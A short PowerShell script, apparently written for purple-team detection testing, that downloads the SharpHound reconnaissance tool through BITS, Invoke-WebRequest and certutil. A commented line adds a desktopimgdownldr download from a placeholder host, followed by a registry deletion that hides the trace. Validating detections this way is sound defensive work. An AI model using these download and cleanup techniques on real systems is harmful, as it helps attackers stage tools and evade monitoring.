#Get SharpHound

# a quick and dirty script to see if u can download sharphound a few different ways so you can see if u would detect
# it's worth throwing some other download types in after u have validated you can catch the obvious

#if you are running on Server 2008 R2 SP1 and it hasn't had TLS1.1/1.2 set as default you need to either set the reg keys and reboot or
# download and execute this and reboot: MicrosoftEasyFix51044.msi


$url = "https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe?raw=true"

$start_time = Get-Date

$output = "$PSScriptRoot\SharpHound.exe"


#try with bITS
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output

Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

#try with web request
Invoke-WebRequest -Uri $url -OutFile $output
Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

#try with certutil
certutil.exe -urlcache -f $url $output

#try with desktopimgdownldr.exe (windows 10) (use cmd.exe)
#set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr && reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP /f
